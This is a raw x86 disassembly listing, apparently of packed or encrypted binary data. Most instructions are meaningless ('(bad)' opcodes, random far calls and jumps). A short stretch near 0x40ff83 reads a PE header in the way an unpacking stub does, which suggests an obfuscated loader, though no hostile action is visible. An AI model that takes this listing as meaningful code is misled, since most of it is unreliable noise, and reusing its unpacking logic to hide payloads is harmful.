  40f893:	fisub  WORD PTR [edi+0x68]
  40f896:	(bad)  
  40f898:	dec    ecx
  40f899:	push   cs
  40f89a:	cmp    BYTE PTR [edx],0xd1
  40f89d:	and    edi,DWORD PTR [ebx]
  40f89f:	call   0xbac41f66
  40f8a4:	or     DWORD PTR [ecx+0x65],ecx
  40f8a7:	pop    ecx
  40f8a8:	in     al,dx
  40f8a9:	jne    0x40f8ed
  40f8ab:	dec    ebx
  40f8ac:	adc    esi,DWORD PTR [edx+ecx*4]
  40f8af:	cmp    eax,0xdbacab51
  40f8b4:	xor    esp,DWORD PTR [edx]
  40f8b6:	jo     0x40f8e2
  40f8b8:	pop    ebp
  40f8b9:	adc    esp,DWORD PTR [edx-0x3f90798e]
  40f8bf:	cmp    ebx,DWORD PTR [ebp-0x4cd60275]
  40f8c5:	int3   
  40f8c6:	mov    edi,0x9d10fa60
  40f8cb:	push   eax
  40f8cc:	fdivr  QWORD PTR [eax-0x6d]
  40f8cf:	push   esp
  40f8d0:	retf   0x78b2
  40f8d3:	adc    al,0x72
  40f8d5:	sub    ah,BYTE PTR [ebx+0x15]
  40f8d8:	cld    
  40f8d9:	mov    ds:0x395a50c7,al
  40f8de:	dec    eax
  40f8df:	stos   BYTE PTR es:[edi],al
  40f8e0:	jno    0x40f8f2
  40f8e2:	push   0x7d
  40f8e4:	mov    edx,0x85af7ca5
  40f8e9:	dec    ecx
  40f8ea:	mov    bh,cl
  40f8ec:	cmp    eax,DWORD PTR [ebx+0x5105ecef]
  40f8f2:	stc    
  40f8f3:	ja     0x40f92f
  40f8f5:	push   ebp
  40f8f6:	pop    es
  40f8f7:	lods   al,BYTE PTR ds:[esi]
  40f8f8:	sbb    al,BYTE PTR [eax+edi*1]
  40f8fb:	adc    esp,eax
  40f8fd:	addr16 mov dl,ah
  40f900:	push   ebp
  40f901:	mov    ebp,0x5f4cbd2b
  40f906:	xchg   ecx,eax
  40f907:	cmc    
  40f908:	stos   DWORD PTR es:[edi],eax
  40f909:	hlt    
  40f90a:	adc    eax,DWORD PTR [ebp+0x3d8eb505]
  40f910:	dec    esp
  40f911:	cmc    
  40f912:	sbb    BYTE PTR [edi+0x4a],dh
  40f915:	arpl   bx,dx
  40f917:	(bad)  
  40f918:	call   0x48c3a4bf
  40f91d:	stos   DWORD PTR es:[edi],eax
  40f91e:	retf   0xc8e2
  40f921:	jbe    0x40f8d0
  40f923:	mov    ah,0x96
  40f925:	mov    edx,0x7056d94
  40f92a:	ins    DWORD PTR es:[edi],dx
  40f92b:	mov    ecx,0x4964cc66
  40f930:	mov    al,0xbc
  40f932:	jecxz  0x40f8f2
  40f934:	ret    
  40f935:	cmp    DWORD PTR [edx+0x44b61504],0x19
  40f93c:	xchg   BYTE PTR [esi-0x5f20e503],ch
  40f942:	das    
  40f943:	fs into 
  40f945:	fs (bad) 
  40f947:	arpl   WORD PTR ds:0xd656ffba,di
  40f94d:	sub    bl,BYTE PTR [ecx+ebp*8]
  40f950:	mov    dl,BYTE PTR [ebx+0x26]
  40f953:	dec    edx
  40f954:	xchg   ecx,edi
  40f956:	add    al,0x72
  40f958:	jle    0x40f966
  40f95a:	in     eax,0xcf
  40f95c:	cld    
  40f95d:	fadd   DWORD PTR [eax]
  40f95f:	sbb    ebp,DWORD PTR [edi]
  40f961:	aad    0x55
  40f963:	ja     0x40f90a
  40f965:	nop
  40f966:	push   ds
  40f967:	jecxz  0x40f968
  40f969:	lods   eax,DWORD PTR ds:[esi]
  40f96a:	jns    0x40f9bc
  40f96c:	cmp    eax,0x48562630
  40f971:	and    DWORD PTR [edx],esi
  40f973:	adc    al,0x8
  40f975:	pop    ds
  40f976:	cdq    
  40f977:	jns    0x40f8f9
  40f979:	xor    bh,bh
  40f97b:	and    eax,0xe430d9b7
  40f980:	icebp  
  40f981:	mov    ebp,0x5b6c58d5
  40f986:	or     esp,DWORD PTR ds:0xc17ef606
  40f98c:	data16 arpl WORD PTR [ebp+0xd],bp
  40f990:	pop    esi
  40f991:	shr    BYTE PTR [esp+esi*1+0x10],0xf7
  40f996:	imul   edx,eax,0x29
  40f999:	test   al,0x58
  40f99b:	fmul   DWORD PTR [ecx-0x280476ca]
  40f9a1:	dec    esp
  40f9a2:	cmp    ecx,ebx
  40f9a4:	aaa    
  40f9a5:	test   BYTE PTR [eax-0x68b60026],al
  40f9ab:	mov    ecx,0x8e7b638
  40f9b0:	aas    
  40f9b1:	mov    DWORD PTR [ecx-0x18],ebp
  40f9b4:	dec    ebx
  40f9b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9b6:	in     eax,dx
  40f9b7:	hlt    
  40f9b8:	movsx  esp,WORD PTR [esi-0x79]
  40f9bc:	shr    BYTE PTR [ecx+eiz*4-0x5fae0ff8],cl
  40f9c3:	push   edx
  40f9c4:	inc    edi
  40f9c5:	loopne 0x40fa0e
  40f9c7:	fisttp QWORD PTR [ebp+ecx*8+0x30c62098]
  40f9ce:	and    eax,0x6c368790
  40f9d3:	push   ds
  40f9d4:	(bad)  
  40f9d5:	push   0xb8893b87
  40f9da:	xchg   ebx,eax
  40f9db:	bound  edx,QWORD PTR [ecx-0x58]
  40f9de:	pop    ds
  40f9df:	(bad)  
  40f9e0:	rcl    al,1
  40f9e2:	push   edi
  40f9e3:	xlat   BYTE PTR ds:[ebx]
  40f9e4:	jp     0x40fa2a
  40f9e6:	pop    eax
  40f9e7:	xchg   ebx,eax
  40f9e8:	shr    edx,cl
  40f9ea:	dec    ecx
  40f9eb:	in     eax,dx
  40f9ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9ed:	pusha  
  40f9ee:	mov    ah,0x52
  40f9f0:	call   0xe3ee:0xc93e8075
  40f9f7:	in     eax,0xba
  40f9f9:	ficomp WORD PTR [esi-0x4ee77fa0]
  40f9ff:	imul   ebx,DWORD PTR [ebp-0x147c48ac],0xffffffbc
  40fa06:	and    eax,0xc3e7c510
  40fa0b:	push   es
  40fa0c:	dec    ecx
  40fa0d:	imul   edx,DWORD PTR [eax],0xffffff89
  40fa10:	nop
  40fa11:	imul   edi,DWORD PTR [ebx+0x68b240c9],0xf7d95707
  40fa1b:	ins    BYTE PTR es:[edi],dx
  40fa1c:	and    eax,0xe3f011c6
  40fa21:	pop    ebp
  40fa22:	arpl   WORD PTR [eax],si
  40fa24:	pop    ebp
  40fa25:	mov    bl,0x9f
  40fa27:	mov    DWORD PTR [ebx],eax
  40fa29:	test   al,0xce
  40fa2b:	lock ret 0xa2a
  40fa2f:	mov    ds:0x96781192,eax
  40fa34:	leave  
  40fa35:	push   ecx
  40fa36:	ror    BYTE PTR [edi-0x78],0x3f
  40fa3a:	call   0xc9e1:0xaf2edc75
  40fa41:	lock xchg ebx,eax
  40fa43:	mov    edi,0x6d6d0e2e
  40fa48:	fsub   DWORD PTR [esi+0x560fc8ea]
  40fa4e:	lods   eax,DWORD PTR ds:[esi]
  40fa4f:	pop    ss
  40fa50:	fucomip st,st(1)
  40fa52:	fnstsw WORD PTR [esi]
  40fa54:	or     al,0x9d
  40fa56:	enter  0x3fa3,0xc5
  40fa5a:	enter  0x63a6,0xc
  40fa5e:	cmovnp edx,DWORD PTR [eax]
  40fa61:	dec    esp
  40fa62:	sti    
  40fa63:	and    al,0xc4
  40fa65:	imul   eax
  40fa67:	fwait
  40fa68:	ins    BYTE PTR es:[edi],dx
  40fa69:	mov    al,0x40
  40fa6b:	or     DWORD PTR [ecx+0xb8b425],edi
  40fa71:	pcmpgtd mm3,QWORD PTR [esp+eiz*8+0x3e861a54]
  40fa79:	mov    bh,0xe0
  40fa7b:	jl     0x40faf2
  40fa7d:	adc    DWORD PTR [eax],ebx
  40fa7f:	sbb    eax,0x3ecb2637
  40fa84:	(bad)  
  40fa85:	repz fcom QWORD PTR [edx]
  40fa88:	in     al,0xdf
  40fa8a:	sub    eax,0x5ff613ab
  40fa8f:	adc    dh,BYTE PTR [esi-0x331916b9]
  40fa95:	and    al,BYTE PTR [ebx-0xbd41950]
  40fa9b:	mov    ds:0xcae4118c,eax
  40faa0:	mov    al,ds:0x872d0eba
  40faa5:	dec    esp
  40faa6:	inc    edx
  40faa7:	jb     0x40fa5c
  40faa9:	out    dx,eax
  40faaa:	rcr    DWORD PTR [edi-0xd],0xa5
  40faae:	sub    DWORD PTR [ecx+edi*8-0x25439297],esi
  40fab5:	fmul   DWORD PTR [edx]
  40fab7:	and    ah,BYTE PTR [esi+0x5dba6b66]
  40fabd:	int3   
  40fabe:	ss aam 0xa8
  40fac1:	inc    ecx
  40fac2:	fsub   DWORD PTR [ebp-0x642fd860]
  40fac8:	mov    dh,0xee
  40faca:	inc    esi
  40facb:	push   ecx
  40facc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40facd:	lea    ecx,[edx]
  40facf:	mov    ds:0x3136a924,eax
  40fad4:	add    dh,BYTE PTR ds:0xacf762a8
  40fada:	adc    eax,0x23182496
  40fadf:	test   BYTE PTR [edi+0x2c61a034],dl
  40fae5:	mov    ?,WORD PTR [esi*8+0x75fb2c16]
  40faec:	xlat   BYTE PTR fs:[ebx]
  40faee:	aas    
  40faef:	(bad)  
  40faf0:	sahf   
  40faf1:	mov    edx,DWORD PTR [eax-0x5ad49c60]
  40faf7:	ja     0x40fb12
  40faf9:	xor    BYTE PTR [esi-0x705b1c93],bl
  40faff:	stos   DWORD PTR es:[edi],eax
  40fb00:	fsub   st(3),st
  40fb02:	xor    DWORD PTR [esi+0x43],esi
  40fb05:	adc    esi,edi
  40fb07:	push   ebp
  40fb08:	dec    ecx
  40fb09:	cmp    eax,0x1d7f905d
  40fb0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb0f:	mov    ah,0x6b
  40fb11:	pop    edx
  40fb12:	pop    edi
  40fb13:	push   ecx
  40fb14:	leave  
  40fb15:	mov    ds:0xfcab10e5,eax
  40fb1a:	mov    ?,WORD PTR [edi+0x1d]
  40fb1d:	xchg   edx,eax
  40fb1e:	bound  edi,QWORD PTR [ebx-0x507aff8f]
  40fb24:	inc    eax
  40fb25:	in     al,dx
  40fb26:	sar    DWORD PTR [ebx],0x2
  40fb29:	jae    0x40fb1f
  40fb2b:	mov    ebx,0x8a9c7492
  40fb30:	(bad)  
  40fb31:	mov    cl,0x2
  40fb33:	in     eax,0xc8
  40fb35:	mov    bl,0x7c
  40fb37:	xchg   BYTE PTR [esi],dh
  40fb39:	arpl   WORD PTR [ecx],dx
  40fb3b:	aad    0x1b
  40fb3d:	and    BYTE PTR [ebx],ah
  40fb3f:	mov    al,0xe4
  40fb41:	and    DWORD PTR [edi],esi
  40fb43:	stos   BYTE PTR es:[edi],al
  40fb44:	dec    eax
  40fb45:	fcmovnbe st,st(0)
  40fb47:	adc    DWORD PTR [esi-0x45],ebp
  40fb4a:	js     0x40fadc
  40fb4c:	rol    eax,0xa4
  40fb4f:	lods   eax,DWORD PTR ds:[esi]
  40fb50:	imul   ebp,ebp,0x281cfe73
  40fb56:	cmp    ch,bl
  40fb58:	repnz inc edi
  40fb5a:	mov    ah,0x68
  40fb5c:	loope  0x40fb0d
  40fb5e:	xchg   ebx,eax
  40fb5f:	leave  
  40fb60:	dec    ecx
  40fb61:	(bad)  
  40fb62:	sbb    esi,DWORD PTR ds:0x5cf2e4fe
  40fb68:	loopne 0x40fb15
  40fb6a:	jmp    0x3e380dc8
  40fb6f:	inc    edi
  40fb70:	iret   
  40fb71:	(bad)  
  40fb72:	repz push 0x0
  40fb75:	jae    0x40fb0c
  40fb77:	mov    al,0xac
  40fb79:	mov    edx,0x87e3a963
  40fb7e:	(bad)  
  40fb7f:	push   0x5bcab43d
  40fb84:	pop    edx
  40fb85:	dec    esi
  40fb86:	lods   al,BYTE PTR ds:[esi]
  40fb87:	inc    ebx
  40fb88:	aam    0xa4
  40fb8a:	add    edx,DWORD PTR [edi]
  40fb8c:	ja     0x40fb87
  40fb8e:	imul   ebx,ecx,0x45426d42
  40fb94:	mov    edi,0xb2d7b7eb
  40fb99:	cdq    
  40fb9a:	push   ecx
  40fb9b:	neg    DWORD PTR ds:0x42e0a4
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0x66
  40fbb3:	sahf   
  40fbb4:	jmp    0x40fc00
  40fbb6:	xor    BYTE PTR [ecx+0x7da37070],0x70
  40fbbd:	jo     0x40fc20
  40fbbf:	call   0xe696:0x32e7c927
  40fbc6:	jnp    0x40fbaf
  40fbc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbc9:	leave  
  40fbca:	pop    DWORD PTR [eax-0xcc7dc0a]
  40fbd0:	adc    eax,0xf2b8910a
  40fbd5:	int3   
  40fbd6:	pop    ds
  40fbd7:	ss js  0x40fbf1
  40fbda:	mov    eax,0xc55fe11e
  40fbdf:	dec    esi
  40fbe0:	xor    BYTE PTR [ebp-0x3a],bl
  40fbe3:	test   BYTE PTR [ebp+0x4d],dh
  40fbe6:	dec    edx
  40fbe7:	inc    esi
  40fbe8:	add    ecx,ebx
  40fbea:	and    bl,al
  40fbec:	sub    BYTE PTR [ecx],al
  40fbee:	dec    esp
  40fbef:	je     0x40fbf7
  40fbf1:	stos   DWORD PTR es:[edi],eax
  40fbf2:	xchg   ecx,eax
  40fbf3:	fs adc eax,0x48
  40fbf7:	das    
  40fbf8:	mov    ebp,0x2e6d49e6
  40fbfd:	(bad)  
  40fbfe:	push   edx
  40fbff:	ret    
  40fc00:	sub    al,dh
  40fc02:	mov    ebx,0x2408404f
  40fc07:	icebp  
  40fc08:	xchg   ebx,ebp
  40fc0a:	call   0xd4cb:0x9c478742
  40fc11:	cmp    al,0x59
  40fc13:	les    ebp,FWORD PTR [eax-0x1e17d763]
  40fc19:	(bad)  
  40fc1b:	xchg   ebp,eax
  40fc1c:	jl     0x40fc1d
  40fc1e:	(bad)  
  40fc1f:	dec    DWORD PTR [edi+0x27b89fdd]
  40fc25:	lds    ecx,FWORD PTR [edi+0x4ccf4c9]
  40fc2b:	fld    QWORD PTR [edi+0x7a]
  40fc2e:	aam    0x7b
  40fc30:	xchg   ecx,eax
  40fc31:	adc    eax,0xd629db81
  40fc36:	lock and al,0xb
  40fc39:	mov    dh,0xd7
  40fc3b:	jmp    0x9cba84c9
  40fc40:	sbb    al,BYTE PTR [edi+0x72ae069d]
  40fc46:	and    al,0x7f
  40fc48:	sbb    eax,0xe8754983
  40fc4d:	jmp    0x11bd:0x4ba94107
  40fc54:	fs jge 0x40fc6f
  40fc57:	pop    ecx
  40fc58:	test   al,0x86
  40fc5a:	or     dl,BYTE PTR [ecx]
  40fc5c:	mov    ch,0x1
  40fc5e:	lds    esp,FWORD PTR [ecx-0x4]
  40fc61:	in     eax,0x51
  40fc63:	inc    esi
  40fc64:	mov    ebx,0xd45f4c3e
  40fc69:	leave  
  40fc6a:	push   esi
  40fc6b:	inc    edi
  40fc6c:	into   
  40fc6d:	nop
  40fc6e:	add    ch,BYTE PTR [ebp+0x2c]
  40fc71:	pop    ebp
  40fc72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc73:	sbb    esi,DWORD PTR [edx-0x58]
  40fc76:	mov    edx,0xf837f9e0
  40fc7b:	leave  
  40fc7c:	bound  esi,QWORD PTR [eax]
  40fc7e:	aad    0x2c
  40fc80:	sbb    DWORD PTR [edx-0x6280c707],ecx
  40fc86:	enter  0xeb8,0xa6
  40fc8a:	pop    ss
  40fc8b:	sub    al,dl
  40fc8d:	cmp    BYTE PTR [edx],bl
  40fc8f:	std    
  40fc90:	jno    0x40fc54
  40fc92:	(bad)  
  40fc93:	pop    ebx
  40fc94:	pop    ecx
  40fc95:	jecxz  0x40fc63
  40fc97:	cmp    edi,DWORD PTR [ebx]
  40fc99:	or     al,0x6b
  40fc9b:	gs adc eax,0x5961527
  40fca1:	push   esi
  40fca2:	les    edx,FWORD PTR [edi-0x544a625c]
  40fca8:	ret    0xbee1
  40fcab:	cmp    eax,0xffb25746
  40fcb0:	mov    ah,0x44
  40fcb2:	loope  0x40fcaf
  40fcb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcb5:	popf   
  40fcb6:	cmp    esp,DWORD PTR [ebp+ebx*1+0x1448749c]
  40fcbd:	mov    ebp,0x1bee2e92
  40fcc2:	inc    ebp
  40fcc3:	stos   BYTE PTR es:[edi],al
  40fcc4:	adc    esp,0x5837dcf0
  40fcca:	push   ebp
  40fccb:	jns    0x40fcf6
  40fccd:	dec    esi
  40fcce:	cld    
  40fccf:	pop    edx
  40fcd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcd1:	je     0x40fccb
  40fcd3:	push   ss
  40fcd4:	std    
  40fcd5:	into   
  40fcd6:	jg     0x40fcbb
  40fcd8:	add    dl,BYTE PTR [edi-0x34]
  40fcdb:	add    BYTE PTR [edx],0xf0
  40fcde:	add    al,0x2e
  40fce0:	ja     0x40fd33
  40fce2:	pop    ebp
  40fce3:	mov    ds:0xede2406b,eax
  40fce8:	rcl    DWORD PTR [edx-0x38c75300],cl
  40fcee:	repz jge 0x40fd0b
  40fcf1:	shl    dh,1
  40fcf3:	mov    ah,0xed
  40fcf5:	imul   edi,DWORD PTR [edx+edx*8-0x4f47141],0x67977f6a
  40fd00:	cdq    
  40fd01:	(bad)  
  40fd02:	repnz mov dh,0x48
  40fd05:	push   ds
  40fd06:	jmp    0x40fcbc
  40fd08:	xor    dl,BYTE PTR [eax+0x5f]
  40fd0b:	jno    0x40fd53
  40fd0d:	jo     0x40fcff
  40fd0f:	sub    dl,cl
  40fd11:	or     ebp,edx
  40fd13:	mov    ah,0xbb
  40fd15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd16:	jb     0x40fd6b
  40fd18:	scas   eax,DWORD PTR es:[edi]
  40fd19:	imul   esp,DWORD PTR [ebx],0xffffff9b
  40fd1c:	jnp    0x40fd98
  40fd1e:	mov    esi,0xe67b2b49
  40fd23:	add    edx,DWORD PTR [ebx+eax*4+0x6e]
  40fd27:	outs   dx,DWORD PTR ds:[esi]
  40fd28:	cli    
  40fd29:	mov    bl,0x6d
  40fd2b:	and    al,0xa3
  40fd2d:	xchg   edi,eax
  40fd2e:	or     ebp,edi
  40fd30:	push   ss
  40fd31:	hlt    
  40fd32:	pop    ebx
  40fd33:	(bad)
  40fd36:	aad    0xc1
  40fd38:	xchg   ecx,eax
  40fd39:	(bad)  
  40fd3a:	rol    BYTE PTR [ebp-0x6ab50fd4],0xfc
  40fd41:	push   eax
  40fd42:	pop    ecx
  40fd43:	nop
  40fd44:	sbb    dh,BYTE PTR [ebx-0x7ccbac73]
  40fd4a:	xor    BYTE PTR [edi-0x12f694f9],bh
  40fd50:	fst    DWORD PTR [esi]
  40fd52:	(bad)  
  40fd54:	call   0xfed13e1e
  40fd59:	dec    esi
  40fd5a:	outs   dx,BYTE PTR ds:[esi]
  40fd5b:	dec    edi
  40fd5c:	sbb    eax,0xb4db2826
  40fd61:	adc    al,0xa0
  40fd63:	jns    0x40fd2e
  40fd65:	add    BYTE PTR [edx],dh
  40fd67:	(bad)  
  40fd68:	lds    ebp,FWORD PTR [ebp+0x1dac2baa]
  40fd6e:	and    DWORD PTR [esi+0x68],esp
  40fd71:	mov    edi,edi
  40fd73:	stc    
  40fd74:	jecxz  0x40fd27
  40fd76:	and    eax,ecx
  40fd78:	test   al,0x5e
  40fd7a:	or     eax,0x5519bb9
  40fd7f:	(bad)  
  40fd80:	cmp    al,0x65
  40fd82:	and    al,0x1e
  40fd84:	and    bl,BYTE PTR [edx-0x6e]
  40fd87:	outs   dx,BYTE PTR ds:[esi]
  40fd88:	adc    edx,edi
  40fd8a:	push   cs
  40fd8b:	push   0x4e
  40fd8d:	cmp    DWORD PTR [edi+0x4c],ebx
  40fd90:	or     dl,BYTE PTR [eax-0x640ab33f]
  40fd96:	dec    DWORD PTR [ebp-0x1e]
  40fd99:	push   ss
  40fd9a:	popa   
  40fd9b:	(bad)  [ebp+0x44b44b7d]
  40fda1:	test   DWORD PTR [ebx],ecx
  40fda3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fda4:	dec    eax
  40fda5:	push   0xfffffff4
  40fda7:	push   ecx
  40fda8:	push   edx
  40fda9:	shl    DWORD PTR [ebp+0x3ec3d7dd],cl
  40fdaf:	fst    QWORD PTR [edi]
  40fdb1:	dec    ebx
  40fdb2:	push   0xffffffe7
  40fdb4:	or     edx,ebx
  40fdb6:	(bad)  
  40fdb8:	xchg   ebp,eax
  40fdb9:	xchg   ebx,eax
  40fdba:	push   0x11
  40fdbc:	jb     0x40fd73
  40fdbe:	mov    ch,0xd7
  40fdc0:	jnp    0x40fdc0
  40fdc2:	pop    ebp
  40fdc3:	jecxz  0x40fde9
  40fdc5:	mov    cl,0x39
  40fdc7:	mov    al,0xa2
  40fdc9:	add    BYTE PTR [ebp-0x74eda0d8],dl
  40fdcf:	fwait
  40fdd0:	mov    ch,0xb
  40fdd2:	sbb    al,0x74
  40fdd4:	shr    BYTE PTR [edx],cl
  40fdd6:	pushf  
  40fdd7:	mov    al,0xda
  40fdd9:	loope  0x40fd69
  40fddb:	jmp    0x93b66cf
  40fde0:	mov    edx,0x2309a303
  40fde5:	mulps  xmm1,XMMWORD PTR [ebx]
  40fde8:	loopne 0x40fe4b
  40fdea:	push   0xf624b01e
  40fdef:	mov    ecx,gs
  40fdf1:	xor    eax,0x57672f3e
  40fdf6:	iret   
  40fdf7:	jle    0x40fe72
  40fdf9:	adc    eax,0x3b735101
  40fdfe:	jb     0x40fe2e
  40fe00:	mov    bl,0xae
  40fe02:	test   eax,0x7b575964
  40fe07:	push   0x8974995c
  40fe0c:	retf   
  40fe0d:	loope  0x40fe56
  40fe0f:	(bad)  
  40fe10:	les    eax,FWORD PTR [ebp+0x42]
  40fe13:	xlat   BYTE PTR ds:[ebx]
  40fe14:	into   
  40fe15:	or     eax,0x6aed3079
  40fe1a:	bound  edx,QWORD PTR [esi]
  40fe1c:	lods   eax,DWORD PTR ds:[esi]
  40fe1d:	pop    ss
  40fe1e:	repz in eax,0xc5
  40fe21:	(bad)  [eax-0x2e]
  40fe24:	arpl   WORD PTR [edx+ebp*1+0x4eaf1631],dx
  40fe2b:	adc    ah,cl
  40fe2d:	retf   0x7acd
  40fe30:	mov    ebp,0x73d6b6c
  40fe35:	sub    eax,0x3821be15
  40fe3a:	test   al,0x15
  40fe3c:	test   BYTE PTR [edx-0x7e],al
  40fe3f:	jb     0x40feb4
  40fe41:	mov    ebp,0xbdb8eec0
  40fe46:	pop    esp
  40fe47:	push   ebp
  40fe48:	es (bad) 
  40fe4a:	cmc    
  40fe4b:	sbb    al,0x6f
  40fe4d:	mov    ah,dl
  40fe4f:	push   edi
  40fe50:	je     0x40fe1f
  40fe52:	js     0x40fe79
  40fe54:	push   ebp
  40fe55:	fcomp  DWORD PTR [edx]
  40fe57:	fsub   st,st(3)
  40fe59:	test   eax,0x48b39eee
  40fe5e:	rcr    BYTE PTR [ebx],cl
  40fe60:	shl    ah,cl
  40fe62:	push   ebx
  40fe63:	jno    0x40fe09
  40fe65:	leave  
  40fe66:	mov    ch,0x7c
  40fe68:	cmp    eax,0x5a51422c
  40fe6d:	lods   eax,DWORD PTR ds:[esi]
  40fe6e:	cmp    eax,0x68710e40
  40fe73:	pop    ds
  40fe74:	xchg   edi,eax
  40fe75:	add    ch,al
  40fe77:	arpl   WORD PTR [ecx-0x4],si
  40fe7a:	adc    BYTE PTR [ebp-0x14],ch
  40fe7d:	enter  0x91d8,0x63
  40fe81:	test   al,0x45
  40fe83:	pushf  
  40fe84:	mov    eax,ebx
  40fe86:	jg     0x40fed4
  40fe88:	scas   al,BYTE PTR es:[edi]
  40fe89:	out    0xf2,eax
  40fe8b:	pusha  
  40fe8c:	xchg   BYTE PTR [eax-0x27],bh
  40fe8f:	(bad)  
  40fe90:	mov    ebx,0x15fdc8c8
  40fe95:	sub    ebx,edx
  40fe97:	sbb    DWORD PTR [edx+edx*1],edx
  40fe9a:	mov    edi,0x3c43fa72
  40fe9f:	xor    ch,BYTE PTR [ebx-0x2ce9bce3]
  40fea5:	ror    BYTE PTR [esp+eax*4-0x100733e7],1
  40feac:	push   0x32
  40feae:	mov    ds,WORD PTR [edx+ebp*8+0x24f278c2]
  40feb5:	call   0x6151:0x312b1f36
  40febc:	repz out 0x57,al
  40febf:	aam    0xb0
  40fec1:	mov    DWORD PTR [ebx-0x7e188670],ebp
  40fec7:	add    al,0x86
  40fec9:	pop    ebp
  40feca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fecb:	cmp    al,0x92
  40fecd:	fisub  WORD PTR [ebx]
  40fecf:	je     0x40ff02
  40fed1:	mov    DWORD PTR [ebp-0x5c],esp
  40fed4:	bound  ecx,QWORD PTR [edi]
  40fed6:	xchg   esi,eax
  40fed7:	jmp    0x6948168b
  40fedc:	adc    bl,BYTE PTR [eax]
  40fede:	dec    ebx
  40fedf:	aam    0xf7
  40fee1:	jno    0x40fe76
  40fee3:	stos   DWORD PTR es:[edi],eax
  40fee4:	loop   0x40fe80
  40fee6:	or     eax,0x9c3e9b8
  40feeb:	cs inc eax
  40feed:	mov    ecx,0x9f2ad704
  40fef2:	stos   DWORD PTR es:[edi],eax
  40fef3:	shl    DWORD PTR [ebp-0x2572231c],0xc3
  40fefa:	jl     0x40ff24
  40fefc:	jg     0x40ff67
  40fefe:	aas    
  40feff:	sub    al,0x72
  40ff01:	mov    ah,BYTE PTR [esp+ebp*2+0x426ba805]
  40ff08:	xlat   BYTE PTR ds:[ebx]
  40ff09:	push   ss
  40ff0a:	int3   
  40ff0b:	inc    eax
  40ff0c:	jbe    0x40ff42
  40ff0e:	pop    eax
  40ff0f:	push   0x12
  40ff11:	popa   
  40ff12:	or     DWORD PTR [esi-0x61dba69c],ebx
  40ff18:	jecxz  0x40ff05
  40ff1a:	test   al,0x76
  40ff1c:	(bad)  
  40ff1d:	jmp    ebp
  40ff1f:	and    BYTE PTR [ecx+0x501b7d0a],bh
  40ff25:	lds    ecx,FWORD PTR [ebp+ebx*8-0x369553eb]
  40ff2c:	or     al,0x93
  40ff2e:	sub    dh,BYTE PTR [ecx+0x3479a8a1]
  40ff34:	jmp    0x40ff42
  40ff36:	push   ss
  40ff37:	adc    al,0xa
  40ff39:	cmp    ecx,eax
  40ff3b:	rcl    BYTE PTR [eax+0x753d8acf],cl
  40ff41:	in     al,0x61
  40ff43:	cwde   
  40ff44:	sahf   
  40ff45:	fs inc eax
  40ff47:	aam    0xeb
  40ff49:	push   ds
  40ff4a:	add    al,BYTE PTR [ebx+eiz*4+0x3b]
  40ff4e:	push   esp
  40ff4f:	and    dh,BYTE PTR fs:[ebp*1-0x15a1d08e]
  40ff57:	push   esp
  40ff58:	mov    ah,0xd
  40ff5a:	cs cmp ecx,edx
  40ff5d:	jmp    0x40ff2d
  40ff5f:	sub    al,0xf9
  40ff61:	jbe    0x40ff15
  40ff63:	mov    cl,0x52
  40ff65:	sbb    ebx,DWORD PTR [edi+0x70]
  40ff68:	dec    esp
  40ff69:	ss or  eax,edi
  40ff6c:	inc    ebp
  40ff6d:	cld    
  40ff6e:	xor    DWORD PTR [ebp+0x458bf89c],eax
  40ff74:	or     BYTE PTR [edx-0x4bfa3900],cl
  40ff7a:	loopne 0x40ffbe
  40ff7c:	add    BYTE PTR [edx],bh
  40ff7e:	cmp    al,BYTE PTR [eax]
  40ff80:	add    BYTE PTR [edi+esi*1],al
  40ff83:	xor    DWORD PTR ds:0x42e677,0x42fcfe
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fc51,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fcf6
  40ffaa:	and    edx,DWORD PTR ds:0x42e67b
  40ffb0:	mov    DWORD PTR ds:0x42fcf6,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e683,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	jp     0x41000b
  40ffde:	je     0x40ffe4
  40ffe0:	xor    eax,0xa37070bd
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x41003b
  40ffe9:	popa   
  40ffea:	jmp    0x4073c918
  40ffef:	mov    ds:0xeeca85e,eax
  40fff4:	mov    ecx,0xf0418eef
  40fff9:	jo     0x40ffbb
  40fffb:	pop    ecx
  40fffc:	jae    0x410001
  40fffe:	in     al,0xf0
  410000:	mov    al,0x52
  410002:	ds dec edi
  410004:	mov    ebx,0xab81b019
  410009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41000a:	stc    
  41000b:	mov    dh,0xee
  41000d:	adc    ebx,edi
  41000f:	xchg   edx,eax
  410010:	add    eax,0xed66f1ab
  410015:	pop    edx
  410016:	in     eax,dx
  410017:	jp     0x410056
  410019:	mov    eax,cr6
  41001c:	mov    dl,0x3c
  41001e:	sub    al,BYTE PTR [edx-0x3a]
  410021:	xchg   ebx,eax
  410022:	pusha  
  410023:	les    eax,FWORD PTR [edx-0x180667af]
  410029:	sub    BYTE PTR [eax],ah
  41002b:	jp     0x41001c
